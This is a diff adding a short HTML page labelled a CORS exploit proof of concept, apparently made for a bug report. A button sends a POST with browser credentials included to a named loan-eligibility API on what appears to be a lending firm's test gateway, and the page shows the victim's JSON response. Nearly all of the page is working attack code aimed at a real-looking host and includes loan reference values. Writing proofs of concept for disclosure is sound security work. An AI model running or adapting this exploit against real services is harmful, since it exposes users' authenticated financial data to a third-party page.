@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h2>CORS Exploit PoC</h2>
+  <button onclick="exploit()">Exploit CORS</button>
+  <pre id="result"></pre>
+
+<script>
+function exploit() {
+  fetch("https://user-gateway.test.kissht.com/api/v1/users/addons/eligibility", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      "emi_amount":599,
+      "product_name":"PL",
+      "financier_code":"SICREVA",
+      "loan_ref_num":"LOSAXKM5DPEA0Q9J5VO"
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    document.getElementById("result").textContent =
+      JSON.stringify(data, null, 2);
+  })
+  .catch(err => {
+    document.getElementById("result").textContent = "Error: " + err;
+  });
+}
+</script>
+</body>
+</html>
